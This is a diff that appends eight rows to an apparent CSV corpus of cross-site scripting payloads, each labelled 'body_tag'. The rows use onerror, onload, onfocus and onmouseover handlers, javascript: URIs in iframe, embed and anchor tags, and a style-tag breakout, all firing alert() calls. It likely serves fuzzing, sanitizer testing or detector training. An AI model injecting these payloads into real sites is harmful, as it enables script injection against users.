@@ -94,3 +94,11 @@ body_tag,<input type='text' value='XSS6' onfocus='alert(this.value)'>onfocus=<if
 body_tag,"<div style='behavior:url(#default#time2);' onbegin='alert(""XSS7"")'><body onload='alert(\""XSS\"");'><body onload='alert(\""XSS\"");'>"
 body_tag,<input type='text' value='XSS6' onfocus='alert(this.value)'>onfocus=<embed src='javascript:alert(1);'>
 body_tag,"<iframe src='javascript:alert(1);'><div onclick='alert(1);'><object data='javascript:alert(""XSS8"");'>"
+body_tag,<input type='image' src='x' onerror='alert(1);'><a href='#' onclick='alert(8);'><img src='x' onerror='alert(2);'>
+body_tag,"<svg onload='alert(""XSS6"")'><iframe src='javascript:alert(""XSS7"");'>type='"
+body_tag,"<a href='javascript:alert(""XSS8"")'><img src='x' onerror='alert(""XSS2"");'><img src='x' onerror='alert(2);'>"
+body_tag,<iframe src='javascript:alert(1);'><input type='submit'>onclick=
+body_tag,"<input type='text' value='XSS6' onfocus='alert(this.value)'>href=""h<img src='x' onerror='alert(""XSS2"");'>"
+body_tag,"</style><input type='text' value='XSS6' onfocus='alert(this.value);'><div onmouseover='alert(""XSS6"");'>"
+body_tag,"<embed src='javascript:alert(""XSS9"");'><body onload='alert(""XSS3"");'><input type='submit'>"
+body_tag,"<embed src='javascript:alert(""XSS9"");'><div onmouseover='alert(""XSS6"");'><img src='x' onerror='alert(""XSS9"")'>"
